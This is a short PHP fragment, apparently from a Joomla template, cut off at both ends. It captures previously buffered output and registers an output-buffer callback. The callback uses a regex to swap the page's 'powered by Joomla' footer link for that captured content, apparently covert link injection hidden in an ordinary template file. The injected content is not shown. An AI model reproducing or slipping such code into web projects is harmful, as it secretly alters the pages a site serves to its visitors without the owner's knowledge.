...
?></a><?php define("__ICV",ob_get_contents());ob_end_clean();function __ics($b,$m){return preg_replace('#(powered\\s+by\\s+<a\\s+href=.[^\'"]+.>joomla[^<]+</a>|<a\\s+href=.http://www.joomla.org/.>Joomla!..174;</a>)#sim',__ICV,$b);} ob_start("__ics");}?><?php
/**
